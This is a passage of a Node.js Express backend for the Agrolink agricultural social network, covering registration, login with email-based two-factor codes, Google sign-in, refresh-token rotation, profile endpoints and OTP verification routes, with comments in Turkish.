            await fs.unlink(req.file.path).catch(() => {});
        }

        const validUserTypes = ['tarim_ogretmeni', 'tarim_ogrencisi', 'ogretmen', 'ziraat_muhendisi', 'normal_kullanici', 'ciftci_hayvancilik'];
        const finalUserType = validUserTypes.includes(userType) ? userType : 'normal_kullanici';

        await dbRun(
            `INSERT INTO users (id, name, username, email, password, "profilePic", "userType", "registrationIp", "createdAt", "updatedAt")
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, NOW(), NOW())`,
            [userId, name, cleanUsername, cleanEmail, hashedPassword, profilePic, finalUserType, req.ip]
        );

        const tokens = generateTokens({ id: userId, email: cleanEmail, username: cleanUsername, role: 'user' });

        // 🌾 Yeni kullanıcı varsayılan hesapları takip etsin
        try {
            const defaultAccounts = ['agro_sosyal', 'agrolink_news', 'yemektarifleri', 'agroabot', 'akilli.tarlam'];
            for (const uname of defaultAccounts) {
                const acc = await dbGet('SELECT id FROM users WHERE username = $1', [uname]);
                if (acc) {
                    await dbRun(
                        'INSERT INTO follows (id, "followerId", "followingId", "createdAt") VALUES ($1, $2, $3, NOW()) ON CONFLICT ("followerId", "followingId") DO NOTHING',
                        [uuidv4(), userId, acc.id]
                    );
                }
            }
        } catch (followErr) {
            console.warn('⚠️ Otomatik takip hatası:', followErr.message);
        }

        // 📧 Hoş geldiniz + e-posta doğrulama kodu gönder
        const verifyCode    = crypto.randomInt(100000, 999999).toString();
        
        await dbRun(
            `INSERT INTO email_verifications (id, "userId", email, code, "expiresAt") VALUES ($1, $2, $3, $4, NOW() + INTERVAL '15 minutes')`,
            [uuidv4(), userId, cleanEmail, verifyCode]
        );
        if (isGmailAddress(cleanEmail)) sendWelcomeEmail(cleanEmail, name).catch(() => {});

        // Doğrulama kodu içeren ayrı e-posta (sadece gmail)
        sendEmailIfGmail(cleanEmail, '🌾 Agrolink — E-posta Doğrulama Kodunuz', `
<!DOCTYPE html><html lang="tr"><head><meta charset="UTF-8"><style>
body{font-family:'Segoe UI',sans-serif;background:#f4f4f4;margin:0;padding:0}
.container{max-width:600px;margin:20px auto;background:#fff;border-radius:12px;overflow:hidden;box-shadow:0 4px 20px rgba(0,0,0,.1)}
.header{background:linear-gradient(135deg,#2e7d32,#4caf50);padding:40px 30px;text-align:center}
.header h1{color:#fff;margin:0;font-size:28px}
.header p{color:rgba(255,255,255,.9);margin:10px 0 0;font-size:16px}
.content{padding:40px 30px}
.code-box{background:#2e7d32;color:#fff;font-size:40px;font-weight:bold;text-align:center;padding:25px;border-radius:10px;letter-spacing:12px;margin:25px 0}
.info{background:#e8f5e9;padding:20px;border-radius:8px;border-left:4px solid #4caf50}
.footer{background:#f5f5f5;padding:25px 30px;text-align:center;color:#666;font-size:13px}
</style></head><body>
<div class="container">
  <div class="header"><h1>🌾 E-posta Doğrulama</h1><p>Hesabınızı doğrulamak için aşağıdaki kodu kullanın</p></div>
  <div class="content">
    <h2 style="color:#2e7d32">Merhaba ${name},</h2>
    <p>Agrolink hesabınızı oluşturduğunuz için teşekkür ederiz. Hesabınızı aktif etmek için aşağıdaki doğrulama kodunu kullanın:</p>
    <div class="code-box">${verifyCode}</div>
    <div class="info"><strong>⏱️ Bu kod 15 dakika geçerlidir.</strong><br>Kodu kimseyle paylaşmayın.</div>
    <p style="margin-top:25px">Bu işlemi siz yapmadıysanız bu e-postayı dikkate almayın.</p>
    <p>Saygılarımızla,<br><strong>Agrolink Ekibi</strong></p>
  </div>
  <div class="footer"><p>Bu e-posta otomatik gönderilmiştir. &copy; ${new Date().getFullYear()} Agrolink</p></div>
</div></body></html>`).catch(() => {});

        res.status(201).json({
            message: 'Hesap oluşturuldu',
            token: tokens.accessToken,
            refreshToken: tokens.refreshToken,
            emailVerificationRequired: true,
            user: { id: userId, username: cleanUsername, name, email: cleanEmail, profilePic: absoluteUrl(profilePic) }
        });
    } catch (error) {
        console.error('Kayıt hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 2b. KAYIT (register-init alias — UI uyumluluğu için) ──────────
// UI /api/auth/register-init çağırıyor, bu endpoint aynı işlemi yapar
app.post('/api/auth/register-init', registerLimiter, recaptchaMiddleware, upload.single('profilePic'), async (req, res) => {
    try {
        const { name, username, email, password, userType } = req.body;
        if (!name || !username || !email || !password) {
            return res.status(400).json({ error: 'Tüm alanlar zorunludur' });
        }
        if (password.length < 8) return res.status(400).json({ error: 'Şifre en az 8 karakter olmalıdır' });

        const cleanUsername = username.toLowerCase().replace(/[^a-z0-9._-]/g, '');
        const cleanEmail = email.toLowerCase().trim();

        // Sadece kullanıcı adı benzersiz olmalı — aynı e-posta ile birden fazla hesap açılabilir
        const existing = await dbGet('SELECT id FROM users WHERE username = $1', [cleanUsername]);
        if (existing) return res.status(400).json({ error: 'Bu kullanıcı adı alınmış' });

        const hashedPassword = await bcrypt.hash(password, BCRYPT_ROUNDS);
        const userId = uuidv4();

        let profilePic = null;
        if (req.file) {
            // 🔒 Magic bytes + boyut doğrulama (profilePic: max 5 MB)
            try { await verifyUploadedFile(req.file, 'profilePic'); }
            catch (verifyErr) { return res.status(400).json({ error: verifyErr.message }); }
            const filename = `profile_${userId}.webp`;
            const outputPath = path.join(profilesDir, filename);
            try {
                await processImage(req.file.path, outputPath, { width: 300, height: 300, fit: 'cover', quality: 62, effort: 3 });
                profilePic = `/uploads/profiles/${filename}`;
            } catch (e) {
                console.error('Profil resmi işleme hatası'); // 🔒 Detay loglanmıyor
            }
            await fs.unlink(req.file.path).catch(() => {});
        }

        const validUserTypes = ['tarim_ogretmeni', 'tarim_ogrencisi', 'ogretmen', 'ziraat_muhendisi', 'normal_kullanici', 'ciftci_hayvancilik'];
        const finalUserType = validUserTypes.includes(userType) ? userType : 'normal_kullanici';

        await dbRun(
            `INSERT INTO users (id, name, username, email, password, "profilePic", "userType", "registrationIp", "createdAt", "updatedAt")
             VALUES ($1, $2, $3, $4, $5, $6, $7, $8, NOW(), NOW())`,
            [userId, name, cleanUsername, cleanEmail, hashedPassword, profilePic, finalUserType, req.ip]
        );

        // 🌾 Yeni kullanıcı varsayılan hesapları takip etsin
        try {
            const defaultAccounts = ['agro_sosyal', 'agrolink_news', 'yemektarifleri', 'agroabot', 'akilli.tarlam'];
            for (const uname of defaultAccounts) {
                const acc = await dbGet('SELECT id FROM users WHERE username = $1', [uname]);
                if (acc) {
                    await dbRun(
                        'INSERT INTO follows (id, "followerId", "followingId", "createdAt") VALUES ($1, $2, $3, NOW()) ON CONFLICT ("followerId", "followingId") DO NOTHING',
                        [uuidv4(), userId, acc.id]
                    );
                }
            }
        } catch (followErr) {
            console.warn('⚠️ Otomatik takip hatası:', followErr.message);
        }

        // E-posta doğrulama kodu oluştur
        const verifyCode    = crypto.randomInt(100000, 999999).toString();
        
        await dbRun(
            `INSERT INTO email_verifications (id, "userId", email, code, "expiresAt") VALUES ($1, $2, $3, $4, NOW() + INTERVAL '15 minutes')`,
            [uuidv4(), userId, cleanEmail, verifyCode]
        );

        // Doğrulama kodu e-postası - tam HTML şablonuyla
        // Sadece @gmail.com adreslerine doğrulama maili gönder
        const emailResult = isGmailAddress(cleanEmail)
            ? await sendEmailVerificationCode(cleanEmail, name.trim(), verifyCode)
            : { success: true, skipped: true };

        if (!emailResult.success && !emailResult.skipped) {
            // Gmail adresi ama gönderim başarısız → yine de devam et, kullanıcıyı bloke etme
            console.warn('⚠️ Kayıt doğrulama e-postası gönderilemedi (kayıt yine de tamamlandı):', emailResult.error);
        }

        console.log(`📧 Kayıt doğrulama kodu gönderildi: [e-posta gizlendi]`);

        // Hoş geldiniz emaili arka planda gönder (sadece gmail)
        if (isGmailAddress(cleanEmail)) sendWelcomeEmail(cleanEmail, name).catch(() => {});

        res.status(201).json({
            message: 'Doğrulama kodu e-posta adresinize gönderildi. Lütfen kodu girerek kaydınızı tamamlayın.',
            emailVerificationRequired: true,
            requiresVerification: true,
            email: cleanEmail,
            userId
        });
    } catch (error) {
        console.error('Kayıt (init) hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 3. GİRİŞ ──────────────────────────────────────────────────────
app.post('/api/auth/login', loginLimiter, validateAuthInput, recaptchaMiddleware, async (req, res) => {
    try {
        const { email, password, identifier } = req.body;
        // UI'dan "identifier" (e-posta veya kullanıcı adı) gelebilir, geriye dönük uyumluluk için "email" de desteklenir
        const loginId = (identifier || email || '').toLowerCase().trim();
        if (!loginId || !password) return res.status(400).json({ error: 'E-posta/kullanıcı adı ve şifre gerekli' });

        // ✅ IP bazlı brute-force (HYDRA koruması)
        const loginIp = (req.ip || req.connection?.remoteAddress || '').replace(/^::ffff:/, '');

        const user = await dbGet(
            `SELECT id, username, name, email, password, role, plan,
                    "profilePic", "coverPic", bio, "isVerified", "isActive",
                    "isBanned", "emailVerified", "twoFactorEnabled",
                    "hasFarmerBadge", "userType", "lastLogin", "registrationIp"
             FROM users WHERE (email = $1 OR username = $1) AND "isActive" = TRUE`,
            [loginId]
        );
        // 🔒 Timing Oracle Koruması: Kullanıcı yoksa bile bcrypt çalıştır
        // Böylece "user yok" ve "şifre yanlış" yanıt süreleri eşitlenir
        const DUMMY_HASH = '$2b$10$abcdefghijklmnopqrstuuAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA';
        if (!user) {
            await bcrypt.compare(password, DUMMY_HASH); // Sahte gecikme — timing oracle önlemi
            recordFailedLogin(loginId);
            return res.status(401).json({ error: 'E-posta/kullanıcı adı veya şifre hatalı' });
        }

        // 🔒 Brute force kontrolü
        const lockout = checkAccountLockout(loginId);
        if (lockout.locked) {
            return res.status(429).json({ error: `Hesap geçici olarak kilitlendi. ${lockout.remainingMin} dakika sonra tekrar deneyin.` });
        }

        const validPassword = await bcrypt.compare(password, user.password);
        if (!validPassword) {
            recordFailedLogin(loginId);
            return res.status(401).json({ error: 'E-posta/kullanıcı adı veya şifre hatalı' });
        }
        clearFailedLogins(loginId);

        // 🔒 BAN KONTROLÜ — Banlı kullanıcı login olabilir ama isBanned:true ile bilgilendirilir
        // Frontend bu flag'i alınca profili 3 sn gösterir sonra erişim engeli modal açar
        if (user.isBanned) {
            const tokens = generateTokens(user);
            const tokenHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
            await dbRun(
                `INSERT INTO refresh_tokens (id, "userId", "tokenHash", ip, "userAgent", "createdAt", "expiresAt")
                 VALUES ($1, $2, $3, $4, $5, NOW(), NOW() + INTERVAL '7 days')`,
                [uuidv4(), user.id, tokenHash, req.ip, req.headers['user-agent'] || '']
            );
            const csrfToken = generateCsrfToken();
            setAuthCookies(res, req, tokens);
            setCsrfCookie(res, req, csrfToken);
            return res.json({
                message: 'Giriş başarılı',
                token: tokens.accessToken,
                refreshToken: tokens.refreshToken,
                isBanned: true,
                user: {
                    id: user.id, username: user.username, name: user.name, email: user.email,
                    profilePic: absoluteUrl(user.profilePic), coverPic: absoluteUrl(user.coverPic),
                    bio: user.bio, isVerified: user.isVerified, hasFarmerBadge: user.hasFarmerBadge,
                    role: user.role, isBanned: true
                }
            });
        }

        // ========== 2FA KONTROLÜ ==========
        if (user.twoFactorEnabled) {
            // 2FA açık → kod oluştur ve gönder
            const twoFACode = crypto.randomInt(100000, 999999).toString();
            // ✅ DÜZELTME: PostgreSQL NOW()+INTERVAL kullan (timezone farkından etkilenmez)

            // Eski kullanılmamış kodları temizle
            await dbRun(
                `UPDATE two_factor_codes SET used = TRUE WHERE "userId" = $1 AND used = FALSE`,
                [user.id]
            );

            // Yeni kodu kaydet
            await dbRun(
                `INSERT INTO two_factor_codes (id, "userId", code, purpose, "expiresAt", used, "createdAt")
                 VALUES ($1, $2, $3, $4, NOW() + INTERVAL '5 minutes', FALSE, NOW())`,
                [uuidv4(), user.id, twoFACode, 'login']
            );

            // 2FA kodunu e-posta ile gönder (tam HTML şablonuyla)
            const emailResult = await sendTwoFactorCodeEmail(user.email, user.name, twoFACode, 'login');

            if (!emailResult.success && !emailResult.skipped) {
                // Gerçek gönderim hatası — gmail adresi ama mail gitmedi
                console.error('❌ 2FA e-postası gönderilemedi:', emailResult.error);
                return res.status(500).json({ error: 'Doğrulama kodu gönderilemedi. Lütfen tekrar deneyin.' });
            }

            if (emailResult.skipped) {
                console.log(`ℹ️  2FA kodu oluşturuldu ama e-posta gönderilmedi (gmail değil): [gizlendi]`);
            } else {
                console.log(`🔐 2FA kodu gönderildi: [e-posta gizlendi]`);
            }

            // Geçici token oluştur (2FA doğrulama için)
            const tempToken = jwt.sign(
                { id: user.id, email: user.email, username: user.username, pending2FA: true },
                JWT_SECRET,
                { expiresIn: '10m', algorithm: 'HS256' }
            );

            return res.json({
                requires2FA: true,
                tempToken,
                userId: user.id,
                email: user.email,
                message: 'Doğrulama kodu e-posta adresinize gönderildi. Lütfen 6 haneli kodu girin.'
            });
        }

        // 2FA kapalı → direkt giriş yap
        // 📧 Giriş bildirimi e-postası (arka planda)
        sendLoginNotificationEmail(user.email, user.name, req).catch(() => {});

        await dbRun('UPDATE users SET "lastLogin" = NOW(), "isOnline" = TRUE, "updatedAt" = NOW() WHERE id = $1', [user.id]);
        // 📊 Giriş saati kaydı — akıllı bildirim zamanlama için
        dbRun(`INSERT INTO user_login_hours ("userId", hour) VALUES ($1, $2)`,
            [user.id, new Date().getHours()]).catch(() => {});

        await dbRun(
            `INSERT INTO login_history (id, "userId", ip, "userAgent", "createdAt")
             VALUES ($1, $2, $3, $4, NOW())`,
            [uuidv4(), user.id, req.ip, req.headers['user-agent'] || '']
        );

        const tokens = generateTokens(user);

        const tokenHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
        await dbRun(
            `INSERT INTO refresh_tokens (id, "userId", "tokenHash", ip, "userAgent", "createdAt", "expiresAt")
             VALUES ($1, $2, $3, $4, $5, NOW(), NOW() + INTERVAL '7 days')`,
            [uuidv4(), user.id, tokenHash, req.ip, req.headers['user-agent'] || '']
        );

        // 🔒 Güvenli cookie + CSRF token (setAuthCookies: path, maxAge, secure düzeltildi)
        const csrfToken = generateCsrfToken();
        setAuthCookies(res, req, tokens);
        setCsrfCookie(res, req, csrfToken);

        res.json({
            message: 'Giriş başarılı',
            token: tokens.accessToken,       // backward compat (mobile/native)
            // 🔒 Mobile backward compat: cookie'yi okuyamayan native app için
            // Tarayıcı istemcileri için HttpOnly cookie kullanın
            refreshToken: tokens.refreshToken,
            user: {
                id: user.id, username: user.username, name: user.name, email: user.email,
                profilePic: absoluteUrl(user.profilePic), coverPic: absoluteUrl(user.coverPic), bio: user.bio,
                isVerified: user.isVerified, hasFarmerBadge: user.hasFarmerBadge, role: user.role
            }
        });
    } catch (error) {
        console.error('Giriş hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ════════════════════════════════════════════════════════════════════
// 🔐 GOOGLE İLE GİRİŞ YAP — OAuth 2.0 / Google Identity Services
// ════════════════════════════════════════════════════════════════════
//
// .env dosyasına ekle:
//   GOOGLE_WEB_CLIENT_ID=<Web OAuth 2.0 Client ID>
//   GOOGLE_ANDROID_CLIENT_ID=<Android OAuth 2.0 Client ID>
//
// Web frontend: google.accounts.id.initialize({ client_id, callback })
//   → callback'den gelen credential (idToken) → /api/auth/google'a POST
// Android: GoogleSignIn SDK → getIdToken() → /api/auth/google'a POST
//
// Kurulum: npm install google-auth-library
// ════════════════════════════════════════════════════════════════════
let GoogleOAuth2Client = null;
try {
    const { OAuth2Client } = require('google-auth-library');
    GoogleOAuth2Client = OAuth2Client;
    console.log('✅ google-auth-library yüklendi — Google Sign-In aktif');
} catch (_) {
    console.warn('⚠️  google-auth-library bulunamadı. (npm install google-auth-library)');
}

async function verifyGoogleIdToken(idToken) {
    if (!GoogleOAuth2Client) throw new Error('google-auth-library kurulu değil');
    const webClientId     = process.env.GOOGLE_WEB_CLIENT_ID;
    const androidClientId = process.env.GOOGLE_ANDROID_CLIENT_ID;
    if (!webClientId && !androidClientId) {
        throw new Error('GOOGLE_WEB_CLIENT_ID veya GOOGLE_ANDROID_CLIENT_ID .env\'de tanımlı değil');
    }
    const audiences = [webClientId, androidClientId].filter(Boolean);
    const client    = new GoogleOAuth2Client(webClientId || androidClientId);
    const ticket    = await client.verifyIdToken({ idToken, audience: audiences });
    const payload   = ticket.getPayload();
    if (!payload?.email)        throw new Error('Google token\'dan e-posta alınamadı');
    if (!payload.email_verified) throw new Error('Google e-postası doğrulanmamış');
    return {
        googleId: payload.sub,
        email   : payload.email.toLowerCase().trim(),
        name    : payload.name || payload.email.split('@')[0],
        picture : payload.picture || null,
    };
}

// POST /api/auth/google
// Body: { idToken: "<google_id_token>" }
app.post('/api/auth/google', loginLimiter, async (req, res) => {
    try {
        if (!GoogleOAuth2Client) {
            return res.status(503).json({ error: 'Google Sign-In şu anda kullanılamıyor. Sunucu yapılandırması eksik.' });
        }

        const { idToken } = req.body;
        if (!idToken) return res.status(400).json({ error: 'Google ID Token gerekli' });

        // ── Google token doğrula ──────────────────────────────────────
        let googleUser;
        try {
            googleUser = await verifyGoogleIdToken(idToken);
        } catch (e) {
            console.warn('[Google Auth] Token doğrulama başarısız:', e.message);
            return res.status(401).json({ error: 'Geçersiz Google token. Lütfen tekrar deneyin.' });
        }

        const { googleId, email, name, picture } = googleUser;

        // ── Kullanıcıyı bul (googleId veya email ile) ─────────────────
        let user = await dbGet(
            `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio,
                    "isVerified", "isActive", "isBanned", "emailVerified",
                    "hasFarmerBadge", "userType", "twoFactorEnabled", "googleId"
             FROM users
             WHERE ("googleId" = $1 OR email = $2) AND "isActive" = TRUE
             LIMIT 1`,
            [googleId, email]
        );

        let isNewUser = false;

        if (!user) {
            // ── Yeni kullanıcı: otomatik kayıt ───────────────────────
            isNewUser       = true;
            const newUserId = uuidv4();

            // Kullanıcı adı üret (e-posta prefix'inden)
            let baseUsername = email.split('@')[0].toLowerCase().replace(/[^a-z0-9._-]/g, '');
            if (baseUsername.length < 3) baseUsername = 'user' + baseUsername;
            let finalUsername = baseUsername;
            let suffix = 1;
            while (await dbGet('SELECT id FROM users WHERE username = $1', [finalUsername])) {
                finalUsername = `${baseUsername}${suffix++}`;
            }

            // Google profil fotoğrafını indir (başarısız olursa atla)
            let profilePic = null;
            if (picture) {
                try {
                    const { default: fetch } = await import('node-fetch');
                    const imgRes = await fetch(picture, { signal: AbortSignal.timeout(5000) });
                    if (imgRes.ok) {
                        const imgBuf  = Buffer.from(await imgRes.arrayBuffer());
                        const filename = `profile_${newUserId}.webp`;
                        const outPath  = path.join(profilesDir, filename);
                        await processImageBuffer(imgBuf, outPath, { width: 300, height: 300, fit: 'cover', quality: 62, effort: 3 });
                        profilePic = `/uploads/profiles/${filename}`;
                    }
                } catch (_) {}
            }

            await dbRun(
                `INSERT INTO users
                   (id, name, username, email, password, "profilePic", "userType",
                    "googleId", "emailVerified", "registrationIp", "createdAt", "updatedAt")
                 VALUES ($1,$2,$3,$4,$5,$6,$7,$8,TRUE,$9,NOW(),NOW())`,
                [newUserId, name, finalUsername, email, '', profilePic, 'normal_kullanici', googleId, req.ip]
            );

            // Varsayılan hesapları takip ettir
            try {
                for (const uname of ['agro_sosyal','agrolink_news','yemektarifleri','agroabot','akilli.tarlam']) {
                    const acc = await dbGet('SELECT id FROM users WHERE username=$1', [uname]);
                    if (acc) await dbRun(
                        'INSERT INTO follows (id,"followerId","followingId","createdAt") VALUES($1,$2,$3,NOW()) ON CONFLICT ("followerId","followingId") DO NOTHING',
                        [uuidv4(), newUserId, acc.id]
                    );
                }
            } catch (_) {}

            if (isGmailAddress(email)) sendWelcomeEmail(email, name).catch(() => {});

            user = await dbGet(
                `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio,
                        "isVerified", "isActive", "isBanned", "emailVerified",
                        "hasFarmerBadge", "userType", "twoFactorEnabled"
                 FROM users WHERE id=$1`,
                [newUserId]
            );
            console.log(`✅ [Google Auth] Yeni kullanıcı: ${maskEmail(email)}`);
        } else {
            // Mevcut kullanıcı — ban kontrolü
            if (user.isBanned) return res.status(403).json({ error: 'Hesabınız askıya alınmış.' });
            // googleId yoksa ilk Google girişi — ekle
            if (!user.googleId) {
                await dbRun(
                    `UPDATE users SET "googleId"=$1, "emailVerified"=TRUE, "updatedAt"=NOW() WHERE id=$2`,
                    [googleId, user.id]
                );
            }
        }

        // ── lastLogin güncelle ────────────────────────────────────────
        await dbRun('UPDATE users SET "lastLogin"=NOW(),"isOnline"=TRUE,"updatedAt"=NOW() WHERE id=$1', [user.id]);
        dbRun(`INSERT INTO user_login_hours ("userId",hour) VALUES($1,$2)`,
            [user.id, new Date().getHours()]).catch(() => {});

        // ── Token üret ────────────────────────────────────────────────
        const tokens    = generateTokens(user);
        const tokenHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
        await dbRun(
            `INSERT INTO refresh_tokens (id,"userId","tokenHash",ip,"userAgent","createdAt","expiresAt")
             VALUES($1,$2,$3,$4,$5,NOW(),NOW()+INTERVAL '7 days')`,
            [uuidv4(), user.id, tokenHash, req.ip, req.headers['user-agent'] || '']
        );

        const csrfToken = generateCsrfToken();
        setAuthCookies(res, req, tokens);
        setCsrfCookie(res, req, csrfToken);

        console.log(`✅ [Google Auth] Giriş başarılı: ${maskEmail(email)}`);

        res.json({
            message     : 'Google ile giriş başarılı',
            token       : tokens.accessToken,
            refreshToken: tokens.refreshToken,
            isNewUser,
            user: {
                id            : user.id,
                username      : user.username,
                name          : user.name,
                email         : user.email,
                profilePic    : absoluteUrl(user.profilePic),
                coverPic      : absoluteUrl(user.coverPic),
                bio           : user.bio,
                isVerified    : user.isVerified,
                hasFarmerBadge: user.hasFarmerBadge,
                role          : user.role,
                emailVerified : true,
            }
        });
    } catch (error) {
        console.error('[Google Auth] Sunucu hatası:', error.message);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── 4. TOKEN YENİLEME ──────────────────────────────────────────────
app.post('/api/auth/refresh', refreshLimiter, async (req, res) => {
    try {
        // 🔒 Önce HttpOnly cookie, sonra body (native/mobile uyumluluk)
        const refreshToken = req.cookies?.refresh_token || req.body?.refreshToken;
        if (!refreshToken) return res.status(401).json({ error: 'Refresh token gerekli' });

        const decoded = jwt.verify(refreshToken, JWT_REFRESH_SECRET);
        const tokenHash = crypto.createHash('sha256').update(refreshToken).digest('hex');

        const stored = await dbGet(
            `SELECT * FROM refresh_tokens WHERE "tokenHash" = $1 AND "isActive" = TRUE AND "expiresAt" > NOW()`,
            [tokenHash]
        );
        if (!stored) return res.status(403).json({ error: 'Geçersiz refresh token' });

        const user = await dbGet(
            // 🔒 Sadece whitelist alanlar
            `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio,
                    "isVerified", "isActive", "userType", "hasFarmerBadge",
                    "isOnline", "isBanned", "emailVerified", "twoFactorEnabled"
             FROM users WHERE id = $1 AND "isActive" = TRUE`,
            [decoded.id]
        );
        if (!user) return res.status(403).json({ error: 'Kullanıcı bulunamadı' });

        // 🔒 Token Rotation: eski token geçersiz kıl, yeni token oluştur
        await dbRun('UPDATE refresh_tokens SET "isActive" = FALSE WHERE "tokenHash" = $1', [tokenHash]);

        const tokens = generateTokens(user);
        const newHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
        await dbRun(
            `INSERT INTO refresh_tokens (id, "userId", "tokenHash", ip, "userAgent", "createdAt", "expiresAt")
             VALUES ($1, $2, $3, $4, $5, NOW(), NOW() + INTERVAL '7 days')`,
            [uuidv4(), user.id, newHash, req.ip, req.headers['user-agent'] || '']
        );

        // 🔒 setAuthCookies ile güvenli cookie set et (FORCE_SECURE_COOKIE destekli)
        setAuthCookies(res, req, tokens);

        res.json({ token: tokens.accessToken, refreshToken: tokens.refreshToken });
    } catch (error) {
        res.status(403).json({ error: 'Geçersiz token' });
    }
});

// ─── 5. MEVCUT KULLANICI BİLGİSİ ───────────────────────────────────
app.get('/api/me', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet(
            `SELECT id, username, name, email, "profilePic", "coverPic", bio, location, website,
                    "isVerified", "hasFarmerBadge", "userType", "createdAt", "lastLogin", "isOnline", role
             FROM users WHERE id = $1`,
            [req.user.id]
        );
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });

        // Kesin sayım - COUNT sütun adını açıkça belirt
        const [followingRow, followerRow, postRow] = await Promise.all([
            pool.query('SELECT COUNT(*)::int AS cnt FROM follows WHERE "followerId" = $1', [req.user.id]),
            pool.query('SELECT COUNT(*)::int AS cnt FROM follows WHERE "followingId" = $1', [req.user.id]),
            pool.query('SELECT COUNT(*)::int AS cnt FROM posts   WHERE "userId" = $1 AND "isActive" = TRUE', [req.user.id]),
        ]);

        const followingCount = followingRow.rows[0]?.cnt ?? 0;
        const followerCount  = followerRow.rows[0]?.cnt  ?? 0;
        const postCount      = postRow.rows[0]?.cnt      ?? 0;

        res.json({
            user: {
                ...user,
                profilePic: absoluteUrl(user.profilePic),
                coverPic: absoluteUrl(user.coverPic),
                followingCount,
                followerCount,
                postCount,
            }
        });
    } catch (error) {
        console.error('api/me hatası:', error);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── /api/auth/me ALIAS (/api/me ile aynı, Agro Dev HTML uyumu için) ──────
app.get('/api/auth/me', authenticateToken, async (req, res) => {
    try {
        const user = await dbGet(
            `SELECT id, username, name, email, "profilePic", "coverPic", bio, location, website,
                    "isVerified", "hasFarmerBadge", "userType", "createdAt", "lastLogin", "isOnline", role, plan
             FROM users WHERE id = $1`,
            [req.user.id]
        );
        if (!user) return res.status(404).json({ error: 'Kullanıcı bulunamadı' });
        res.json({ user: { ...user, profilePic: absoluteUrl(user.profilePic), coverPic: absoluteUrl(user.coverPic) } });
    } catch (e) {
        console.error('auth/me hatası:', e);
        res.status(500).json({ error: 'Sunucu hatası' });
    }
});

// ─── /api/auth/verify-otp ALIAS ──────────────────────────────────────────
// Login 2FA: { tempToken, code }  →  /api/auth/verify-2fa mantığı
// Register : { email, code }      →  /api/auth/register-verify mantığı
app.post('/api/auth/verify-otp', otpLimiter, validateAuthInput, async (req, res) => {
    const { tempToken, code, email } = req.body;
    if (tempToken && code) {
        // 2FA doğrulama (login)
        try {
            let decoded;
            try { decoded = jwt.verify(tempToken, JWT_SECRET, { algorithms: ['HS256'] }); }
            catch { return res.status(401).json({ error: 'Geçersiz veya süresi dolmuş oturum. Lütfen tekrar giriş yapın.' }); }
            if (!decoded.pending2FA) return res.status(400).json({ error: 'Geçersiz istek' });
            const twofa = await dbGet(
                `SELECT * FROM two_factor_codes WHERE "userId" = $1 AND code = $2 AND "expiresAt" > NOW() AND used = FALSE ORDER BY "createdAt" DESC LIMIT 1`,
                [decoded.id, String(code)]
            );
            if (!twofa) return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş kod' });
            await dbRun(`UPDATE two_factor_codes SET used = TRUE WHERE id = $1`, [twofa.id]);
            const user = await dbGet(
                `SELECT id, username, name, email, role, plan, "profilePic", "coverPic", bio, "isVerified", "isActive", "userType", "hasFarmerBadge", "isOnline", "isBanned", "emailVerified", "twoFactorEnabled" FROM users WHERE id = $1 AND "isActive" = TRUE`,
                [decoded.id]
            );
            if (!user) return res.status(401).json({ error: 'Kullanıcı bulunamadı' });
            await dbRun('UPDATE users SET "lastLogin" = NOW(), "isOnline" = TRUE, "updatedAt" = NOW() WHERE id = $1', [user.id]);
            dbRun(`INSERT INTO user_login_hours ("userId", hour) VALUES ($1, $2)`,
                [user.id, new Date().getHours()]).catch(() => {});
            const tokens = generateTokens(user);
            const tokenHash = crypto.createHash('sha256').update(tokens.refreshToken).digest('hex');
            await dbRun(
                `INSERT INTO refresh_tokens (id, "userId", "tokenHash", ip, "userAgent", "createdAt", "expiresAt") VALUES ($1,$2,$3,$4,$5,NOW(),NOW() + INTERVAL '7 days')`,
                [uuidv4(), user.id, tokenHash, req.ip, req.headers['user-agent'] || '']
            );
            const { password: _, ...userSafe } = user;
            return res.json({ token: tokens.accessToken, accessToken: tokens.accessToken, refreshToken: tokens.refreshToken, user: userSafe, verified: true });
        } catch (e) { console.error('verify-otp (2fa) hatası:', e); return res.status(500).json({ error: 'Sunucu hatası' }); }
    } else if (email && code) {
        // Kayıt e-posta doğrulama
        try {
            const cleanEmail = email.toLowerCase().trim();
            const verification = await dbGet(
                `SELECT ev.*, u.id as "userId2" FROM email_verifications ev JOIN users u ON ev."userId" = u.id WHERE u.email = $1 AND ev.code = $2 AND ev.used = FALSE AND ev."expiresAt" > NOW() ORDER BY ev."createdAt" DESC LIMIT 1`,
                [cleanEmail, String(code)]
            );
            if (!verification) return res.status(400).json({ error: 'Geçersiz veya süresi dolmuş kod' });
            await dbRun(`UPDATE users SET "emailVerified" = TRUE, "updatedAt" = NOW() WHERE id = $1`, [verification.userId]);
            await dbRun(`DELETE FROM email_verifications WHERE "userId" = $1`, [verification.userId]);
            const user = await dbGet(`SELECT id, name, username, email, "profilePic", bio, plan FROM users WHERE id = $1`, [verification.userId]);
            const tokens = generateTokens(user);
            return res.status(201).json({ token: tokens.accessToken, accessToken: tokens.accessToken, refreshToken: tokens.refreshToken, user, verified: true });
        } catch (e) { console.error('verify-otp (register) hatası:', e); return res.status(500).json({ error: 'Sunucu hatası' }); }
    } else {
        return res.status(400).json({ error: 'tempToken+code veya email+code gerekli' });
    }
});

// ─── /api/auth/send-otp ALIAS ──────────────────────────────────────────────
// { email, tempToken }   → login 2FA resend
// { email }              → register doğrulama kodu yeniden gönder
app.post('/api/auth/send-otp', otpLimiter, validateAuthInput, async (req, res) => {
    const { email, tempToken } = req.body;
    try {
        if (tempToken) {
            // 2FA yeniden gönder
            let decoded;
